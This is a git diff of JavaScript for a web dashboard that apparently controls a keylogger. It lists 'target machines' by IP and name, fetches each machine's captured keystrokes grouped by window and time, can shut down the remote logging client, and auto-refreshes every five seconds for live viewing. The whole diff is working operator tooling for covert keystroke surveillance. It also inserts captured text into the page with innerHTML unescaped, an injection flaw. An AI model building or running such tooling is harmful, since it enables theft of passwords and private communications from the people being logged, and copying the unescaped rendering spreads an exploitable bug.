@@ -61,7 +61,7 @@ async function GetComputersList() {
     }
 
     try {
-        let response = await fetch("/api/get_target_machines_list", {
+        let response = await fetch("/api/machines", {
             method: "GET",
             headers: {
                 "Authorization": `Bearer ${token}`
@@ -93,7 +93,7 @@ async function GetComputersActivity(machine_sn, start_date, end_date) {
     }
     
     try {
-        let response = await fetch("/api/get_keystrokes?machine_sn=" + machine_sn + "&start_date=" + start_date + "&end_date=" + end_date, {
+        let response = await fetch("/api/keystrokes/"+machine_sn+"?start_date=" + start_date + "&end_date=" + end_date, {
             method: "GET",
             headers: {
                 "Authorization": `Bearer ${token}`
@@ -126,7 +126,7 @@ async function StopListening(machineId) {
     }
 
     try {
-        let response = await fetch(`/api/shutdown_client?machine_sn=${machineId}`, {
+        let response = await fetch(`/api/shutdown?machine_sn=${machineId}`, {
             method: "POST",
             headers: {
                 "Authorization": `Bearer ${token}`
@@ -160,32 +160,46 @@ async function StopListening(machineId) {
     }
 }
 
-async function fetchLogs() {
-    const table = document.getElementById("ComputersTableBody");
-    table.innerHTML = "<tr><td colspan='4' class='text-center'>Loading data...</td></tr>";
 
+let isPopupOpen = false;
+let autoRefreshInterval = null;
+let currentMachineId = null;
+let currentStartDate = null;
+let currentEndDate = null;
+
+async function fetchLogs() {
+    const tableBody = document.getElementById("ComputersTableBody");
+    
     try {
         const data = await GetComputersList();
-        table.innerHTML = "";
+        
 
+        let newContent = "";
+        
         if (!data || typeof data !== "object" || Object.keys(data).length === 0) { 
-            table.innerHTML = "<tr><td colspan='4' class='text-center'>No available data</td></tr>";
-            return;
+            newContent = "<tr><td colspan='4' class='text-center'>No available data</td></tr>";
+        } else {
+            Object.entries(data).forEach(([id, details]) => {
+                newContent += `
+                    <tr>
+                        <td>${id}</td>
+                        <td>${details.ip}</td>
+                        <td>${details.name}</td>
+                        <td>${details.active ? '✅' : '🟩'}</td>
+                    </tr>
+                `;
+            });
         }
+        
 
-        Object.entries(data).forEach(([id, details]) => {
-            const row = document.createElement("tr");
-            row.innerHTML = `
-                <td>${id}</td>
-                <td>${details.ip}</td>
-                <td>${details.name}</td>
-                <td>${details.active ? '✅' : '🟩'}</td>
-            `;
-            table.appendChild(row);
-        });
+        tableBody.innerHTML = newContent;
+        
+
+        addRowClickListeners();
+        
     } catch (error) {
         console.error("Error in fetchLogs:", error);
-        table.innerHTML = "<tr><td colspan='4' class='text-center'>Error loading data</td></tr>";
+        tableBody.innerHTML = "<tr><td colspan='4' class='text-center'>Error loading data</td></tr>";
     }
 }
 
@@ -198,36 +212,71 @@ function formatDateToDDMMYYYY(dateStr) {
 }
 
 async function LoadComputerActivity(machine_sn, start_date, end_date) {
-    const table = document.getElementById("ActivityTable");
-    table.innerHTML = "<tr><td colspan='3' class='text-center'>Loading data...</td></tr>";
+    const activityTable = document.getElementById("ActivityTable");
+    
     try {
         const log = await GetComputersActivity(machine_sn, start_date, end_date);
-        table.innerHTML = "";
+        
+
+        let newContent = "";
         
         if (!log) {
-            table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
-            return;
-        }
-        
-        if (log.error) {
-            table.innerHTML = `<tr><td colspan='3' class='text-center'>${log.error}</td></tr>`;
-            return;
-        }
-        
-        if (typeof log !== "object" || Object.keys(log).length === 0 || !log.logs) {
-            table.innerHTML = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
+            newContent = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
+        } else if (log.error) {
+            newContent = `<tr><td colspan='3' class='text-center'>${log.error}</td></tr>`;
+        } else if (typeof log !== "object" || Object.keys(log).length === 0 || !log.logs) {
+            newContent = "<tr><td colspan='3' class='text-center'>No available data</td></tr>";
         } else {
             Object.entries(log.logs).forEach(([window, val]) => {
                 Object.entries(val).forEach(([time, text]) => {
-                    const row = document.createElement("tr");
-                    row.innerHTML = `<td>${time}</td><td>${window}</td><td>${text}</td>`;
-                    table.appendChild(row);
+                    newContent += `<tr><td>${time}</td><td>${window}</td><td>${text}</td></tr>`;
                 });
             });  
         }
+        
+
+        activityTable.innerHTML = newContent;
+        
     } catch (error) {
         console.error("Error in LoadComputerActivity:", error);
-        table.innerHTML = "<tr><td colspan='3' class='text-center'>Error loading data</td></tr>";
+        activityTable.innerHTML = "<tr><td colspan='3' class='text-center'>Error loading data</td></tr>";
+    }
+}
+
+
+async function updateMachineStatus() {
+    if (!currentMachineId) return;
+    
+    try {
+        const data = await GetComputersList();
+        if (!data || !data[currentMachineId]) return;
+        
+        const machineDetails = data[currentMachineId];
+        const wasActive = document.getElementById("indicator").classList.contains("active");
+        
+
+        let indicator = document.getElementById("indicator");
+        if (machineDetails.active) {
+            indicator.classList.add("active");
+            indicator.title = "Logging is active.";
+        } else {
+            indicator.classList.remove("active");
+            indicator.title = "Logging is not active.";
+        }
+        
+
+        const stopButton = document.getElementById("stopListening");
+        if (machineDetails.active) {
+            stopButton.style.display = "block";
+        } else {
+            stopButton.style.display = "none";
+        }
+        
+        if (machineDetails.active && currentStartDate && currentEndDate) {
+            LoadComputerActivity(currentMachineId, currentStartDate, currentEndDate);
+        }
+    } catch (error) {
+        console.error("Error updating machine status:", error);
     }
 }
 
@@ -238,11 +287,17 @@ const closePopupBtn = document.getElementById("closePopup");
 function closePopup() {
     popup.style.display = "none";
     overlay.style.display = "none";
+    isPopupOpen = false;
+    currentMachineId = null;
+    currentStartDate = null;
+    currentEndDate = null;
 
     const stopListeningButton = document.getElementById("stopListening");
     if (stopListeningButton) {
         stopListeningButton.replaceWith(stopListeningButton.cloneNode(true));
     }
+    
+    setupAutoRefresh();
 }
 
 async function openPopup(machineId, ip, name, active) {
@@ -250,13 +305,20 @@ async function openPopup(machineId, ip, name, active) {
     document.getElementById("compIp").textContent = ip;
     document.getElementById("compName").textContent = name;
 
+    currentMachineId = machineId;
+    isPopupOpen = true;
+
     let indicator = document.getElementById("indicator");
     if (active === '✅') {
         indicator.classList.add("active");
         indicator.title = "Logging is active.";
+        
+        document.getElementById("stopListening").style.display = "block";
     } else {
         indicator.classList.remove("active");
         indicator.title = "Logging is not active.";
+        
+        document.getElementById("stopListening").style.display = "none";
     }
 
     popup.style.display = "block";
@@ -266,6 +328,9 @@ async function openPopup(machineId, ip, name, active) {
     document.getElementById("startDate").value = today;
     document.getElementById("endDate").value = today;
 
+    currentStartDate = formatDateToDDMMYYYY(today);
+    currentEndDate = formatDateToDDMMYYYY(today);
+
     LoadComputerActivity(machineId, formatDateToDDMMYYYY(today), formatDateToDDMMYYYY(today));
 
     const stopListeningButton = document.getElementById("stopListening");
@@ -274,6 +339,35 @@ async function openPopup(machineId, ip, name, active) {
     document.getElementById("stopListening").addEventListener("click", function() {
         const currentMachineId = document.getElementById("compId").textContent;
         StopListening(currentMachineId);
+    });
+    
+    setupAutoRefresh();
+}
+
+function setupAutoRefresh() {
+    if (autoRefreshInterval) {
+        clearInterval(autoRefreshInterval);
+        autoRefreshInterval = null;
+    }
+    
+    if (isPopupOpen) {
+        autoRefreshInterval = setInterval(() => {
+            updateMachineStatus();
+        }, 5000);
+    } else {
+        autoRefreshInterval = setInterval(() => {
+            fetchLogs();
+        }, 5000);
+    }
+}
+
+function addRowClickListeners() {
+    const rows = document.querySelectorAll("#ComputersTableBody tr");
+    rows.forEach(row => {
+        row.addEventListener("click", function() {
+            let rowData = Array.from(this.children).map(td => td.textContent.trim());
+            openPopup(rowData[0], rowData[1], rowData[2], rowData[3]);
+        });
     });
 }
 
@@ -294,8 +388,7 @@ document.addEventListener("DOMContentLoaded", function() {
         BackToLogin();
     });
     
-    const tableBody = document.getElementById("ComputersTableBody");
-    tableBody.addEventListener("click", function(event) {
+    document.getElementById("ComputersTable").addEventListener("click", function(event) {
         let row = event.target.closest("tr");
         if (!row) return;
 
@@ -307,7 +400,12 @@ document.addEventListener("DOMContentLoaded", function() {
         let machineId = document.getElementById("compId").textContent;
         let startDate = document.getElementById("startDate").value;
         let endDate = document.getElementById("endDate").value;
+        
+        currentStartDate = formatDateToDDMMYYYY(startDate);
+        currentEndDate = formatDateToDDMMYYYY(endDate);
 
         LoadComputerActivity(machineId, formatDateToDDMMYYYY(startDate), formatDateToDDMMYYYY(endDate));
     });
+    
+    setupAutoRefresh();
 });
